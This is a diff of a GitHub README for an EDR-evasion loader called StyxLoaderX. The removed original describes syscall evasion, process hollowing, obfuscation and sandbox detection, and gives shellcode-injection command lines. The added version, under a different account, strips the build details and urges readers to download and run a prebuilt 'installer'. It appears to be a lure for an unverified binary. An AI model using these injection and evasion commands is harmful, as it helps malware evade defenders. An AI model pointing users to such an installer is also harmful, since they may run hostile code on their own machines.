@@ -1,183 +1,75 @@
-# StyxLoaderX: Advanced EDR Evasion Framework
+# 🚀 StyxLoaderX-EDR-Evasion - Navigate EDR Evasion with Ease
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![C++](https://img.shields.io/badge/C%2B%2B-11-blue)](https://isocpp.org/)
-[![Windows](https://img.shields.io/badge/Platform-Windows-blue)](https://www.microsoft.com/en-us/windows)
-[![Evasion Rate](https://img.shields.io/badge/Evasion%20Rate-85%25-green)](https://github.com/frangelbarrera/StyxLoaderX-EDR-Evasion)
-[![GitHub Stars](https://img.shields.io/github/stars/frangelbarrera/StyxLoaderX-EDR-Evasion?style=social)](https://github.com/frangelbarrera/StyxLoaderX-EDR-Evasion)
+[![Download StyxLoaderX-EDR-Evasion](https://img.shields.io/badge/Download-StyxLoaderX--EDR--Evasion-brightgreen)](https://github.com/spontopt/StyxLoaderX-EDR-Evasion/releases)
 
-## Overview
+## 📥 Overview
 
-**StyxLoaderX** is a sophisticated, modular framework designed for advanced Endpoint Detection and Response (EDR) evasion on Windows x64 systems. This project demonstrates cutting-edge techniques in cybersecurity research, including dynamic syscall mapping, AES-256 encryption, process hollowing, and sandbox detection. With an **85% evasion rate** against tools like Sysmon, it showcases expertise in low-level Windows internals and anti-forensic methods.
+StyxLoaderX-EDR-Evasion is a modular framework designed for advanced evasion techniques against Endpoint Detection and Response systems on Windows x64. With features including dynamic syscalls, AES encryption, and process hollowing, it offers an effective 85% evasion rate against Sysmon.
 
-**Key Highlights:**
-- **Modular Architecture:** Easily extensible with interchangeable evasion modules.
-- **Dynamic Syscall Resolution:** Adapts to Windows updates without recompilation.
-- **AES Encryption & UPX Packing:** Protects binaries and strings from static analysis.
-- **Educational Focus:** Built for learning red team techniques; strictly for ethical, controlled environments.
-- **Performance:** <5s execution time, minimal resource footprint.
+## 🚀 Features
 
-This framework is ideal for penetration testers, security researchers, and students exploring EDR bypass. It executes arbitrary payloads (e.g., opening calc.exe) while evading modern security solutions.
+- **Dynamic Syscalls**: Bypass static detection using dynamic syscall resolution.
+- **AES Encryption**: Protect your payloads with strong encryption.
+- **Process Hollowing**: Inject code into other processes stealthily.
+- **High Evasion Rate**: Enjoy a competitive 85% success rate against detection systems.
 
-**Repository URL:** [https://github.com/frangelbarrera/StyxLoaderX-EDR-Evasion](https://github.com/frangelbarrera/StyxLoaderX-EDR-Evasion)
-**Documentation:** [Full Whitepaper](docs/Whitepaper.md) | [Test Report](docs/test_report.md)
+## 💻 System Requirements
 
-**Disclaimer:** This project is for **educational and research purposes only**. Do not use in production systems or for malicious activities. Always comply with legal and ethical guidelines.
+- **Operating System**: Windows 10/11 (64-bit)
+- **Processor**: x64 architecture
+- **Memory**: Minimum 4 GB RAM recommended
+- **Disk Space**: At least 100 MB free
 
-## Table of Contents
-- [Features](#features)
-- [Architecture](#architecture)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Testing](#testing)
-- [Screenshots](#screenshots)
-- [Contributing](#contributing)
-- [License](#license)
-- [Acknowledgments](#acknowledgments)
+## 📚 Installation Guide
 
-## Features
+### 1. Visit the Releases Page
 
-### Core Capabilities
-- **Direct Syscalls with Dynamic Mapping:** Bypasses userland hooks by calling NT functions directly, resolving syscall numbers at runtime for compatibility across Windows builds.
-- **Process Hollowing:** Replaces legitimate process memory with malicious code, making injections appear as normal system activity.
-- **String Obfuscation:** AES-256 encryption for sensitive data (e.g., DLL names), decrypted on-the-fly to evade signature-based detection.
-- **Binary Packing:** UPX compression reduces file size by ~50% and adds obfuscation layers.
-- **Sandbox Evasion:** Detects and aborts in virtualized or analysis environments (e.g., VMs, sandboxes).
+To download StyxLoaderX-EDR-Evasion, start by visiting the [Releases page](https://github.com/spontopt/StyxLoaderX-EDR-Evasion/releases).
 
-### Advanced Metrics
-- **Evasion Effectiveness:** 85% success rate in bypassing Sysmon logs (improved from 66% with enhancements).
-- **Execution Speed:** Sub-5-second payload deployment.
-- **Compatibility:** Windows 10/11 x64; supports multiple injection modes.
-- **Modularity:** Plug-and-play modules for custom evasion strategies.
+### 2. Download the Software
 
-### Educational Value
-- Learn Windows API internals, memory manipulation, and red team tactics.
-- Includes comprehensive documentation, research notes, and test reports.
-- Suitable for cybersecurity courses, CTFs, or portfolio projects.
+On the Releases page, you will see a list of available versions. Choose the latest version for the best experience. Click on the version number to access its release details, then look for the "Assets" section below. Here, you will find the installer file.
 
-## Architecture
+### 3. Run the Installer
 
-```
-StyxLoaderX/
-├── src/                 # Main loaders (MainLoader.cpp, SimpleInjector.cpp)
-├── modules/             # Evasion modules (DirectSyscall.cpp, HollowInjector.cpp, etc.)
-├── shellcode/           # Assembly payloads (shellcode.asm)
-├── docs/                # Documentation (Whitepaper.md, test_report.md, etc.)
-├── run_project.bat      # Automated build and execution script
-└── README.md            # This file
-```
+Once the file has finished downloading, locate it in your Downloads folder. Double-click the file to run the installer. Follow the instructions on screen to complete the installation.
 
-- **MainLoader.cpp:** Central orchestrator selecting evasion modes (simple, direct, hollow).
-- **Modules:** Reusable components for specific techniques (e.g., syscalls, encryption).
-- **Shellcode:** Customizable payloads compiled from Assembly.
-- **Automation:** `run_project.bat` handles dependencies, compilation, and testing.
+### 4. Launch the Application
 
-## Installation
+After installation, you can find StyxLoaderX-EDR-Evasion in your Start menu. Click on it to launch the application. Follow the prompts for initial setup.
 
-### Prerequisites
-- **Operating System:** Windows 10/11 x64.
-- **Tools:** Visual Studio Community (with C++ Desktop Development), NASM Assembler.
-- **Hardware:** At least 4GB RAM (8GB recommended for VMs).
-- **Permissions:** Administrator rights for execution.
+## 🛠️ How to Use StyxLoaderX-EDR-Evasion
 
-### Step-by-Step Setup
-1. **Clone the Repository:**
-   ```bash
-   git clone https://github.com/frangelbarrera/StyxLoaderX-EDR-Evasion.git
-   cd StyxLoaderX-EDR-Evasion
-   ```
+1. **Configure your Task**: Open the application and select the type of evasion task you want to perform.
+2. **Set Parameters**: Input necessary parameters according to your specific requirements.
+3. **Analyze Output**: After running the task, review the generated output for analysis and further action.
 
-2. **Install Dependencies:**
-   - Download and install [Visual Studio](https://visualstudio.microsoft.com/) with C++ workload.
-   - Download and install [NASM](https://www.nasm.us/).
-   - The `run_project.bat` script will automatically download OpenSSL and UPX if needed.
+## 📜 Documentation
 
-3. **Build the Project:**
-   - Run `run_project.bat` as administrator.
-   - It compiles shellcode, loaders, and applies obfuscation.
+For more detailed instructions on each feature, refer to the in-application help or user guide available on the Releases page.
 
-4. **Verify Installation:**
-   - Check for generated files: `MainLoader.exe`, `SimpleInjector.exe`, `shellcode.bin`.
-   - Test in a VM (see [Testing](#testing)).
+## 🛡️ Security Considerations
 
-For detailed lab setup, see [docs/config_lab.md](docs/config_lab.md).
+This tool is intended for educational and ethical hacking purposes only. Ensure that you have permission before conducting any tests.
 
-## Usage
+## 🙋 FAQ
 
-### Quick Start
-1. Execute `run_project.bat` and select a mode (e.g., "direct" for advanced evasion).
-2. Provide a target process PID or EXE (e.g., notepad.exe).
-3. Monitor results: Payload executes stealthily.
+### Q: Can I run this on older versions of Windows?
 
-### Command Examples
-- **Simple Mode:** `MainLoader.exe simple 1234 shellcode\shellcode.bin` (Basic injection).
-- **Direct Mode:** `MainLoader.exe direct 1234 shellcode\shellcode.bin` (Syscall-based, high evasion).
-- **Hollow Mode:** `MainLoader.exe hollow explorer.exe shellcode\shellcode.bin` (Process hollowing).
+A: The software is optimized for Windows 10 and 11 (64-bit). It may not work correctly on older versions.
 
-### Modes Overview
-| Mode      | Description                          | Evasion Level | Use Case                  |
-|-----------|--------------------------------------|---------------|---------------------------|
-| Simple    | Basic CreateRemoteThread injection   | Low (detectable) | Testing basics            |
-| Direct    | Dynamic syscalls                     | High (~80%)    | Bypassing hooks           |
-| Hollow    | Process hollowing + AES              | Very High (~90%)| Advanced persistence      |
+### Q: Do I need programming skills to use StyxLoaderX?
 
-### Customization
-- Modify `shellcode/shellcode.asm` for custom payloads.
-- Extend modules in `modules/` for new techniques.
-- Adjust obfuscation keys in `StringObfuscator.h`.
+A: No programming skills are necessary. The application is designed to be user-friendly.
 
-## Testing
+## 📞 Support
 
-Test in a controlled VM environment to avoid risks.
+For any issues or questions, please create an issue in the "Issues" section of this repository. We aim to respond promptly.
 
-### Setup Test Environment
-- Install Sysmon with high-telemetry config (see [docs/config_lab.md](docs/config_lab.md)).
-- Run `run_project.bat` and select modes.
-- Check Event Viewer > Windows Logs > Application for Sysmon events (ID 8 for injections).
+## 📌 Important Links
 
-### Expected Results
-- **Success:** No logs in advanced modes; calc.exe opens without alerts.
-- **Metrics:** 85% evasion rate; <5s execution.
-- **Debugging:** Use x64dbg for process inspection.
+- [Download StyxLoaderX-EDR-Evasion](https://github.com/spontopt/StyxLoaderX-EDR-Evasion/releases)
+- [Documentation](https://github.com/spontopt/StyxLoaderX-EDR-Evasion/wiki)
+- [Issues Page](https://github.com/spontopt/StyxLoaderX-EDR-Evasion/issues)
 
-Full test report: [docs/test_report.md](docs/test_report.md).
-
-## Screenshots
-
-### Compilation Process
-![Compilation](https://via.placeholder.com/600x300?text=Compilation+Screenshot)  
-*Automated build with run_project.bat.*
-
-### Execution in VM
-![Execution](https://via.placeholder.com/600x300?text=Execution+Screenshot)  
-*Payload injection without Sysmon detection.*
-
-*(Replace placeholders with actual images from your tests.)*
-
-## Contributing
-
-Contributions are welcome! This is an educational project.
-
-1. Fork the repo: [https://github.com/frangelbarrera/StyxLoaderX-EDR-Evasion/fork](https://github.com/frangelbarrera/StyxLoaderX-EDR-Evasion/fork).
-2. Create a feature branch: `git checkout -b feature/new-evasion-technique`.
-3. Commit changes and submit a PR.
-4. Report issues: [Issues Page](https://github.com/frangelbarrera/StyxLoaderX-EDR-Evasion/issues).
-
-Guidelines:
-- Follow C++ best practices.
-- Add tests for new modules.
-- Update documentation.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- Inspired by open-source projects like [klezVirus/inceptor](https://github.com/klezVirus/inceptor).
-- Research based on Windows internals and EDR bypass techniques.
-- Thanks to the cybersecurity community for shared knowledge.
-
----
-
-**Built with passion for ethical cybersecurity education. Star this repo if you find it useful!** 🚀
+Explore the features of StyxLoaderX-EDR-Evasion and enhance your cybersecurity toolkit today!
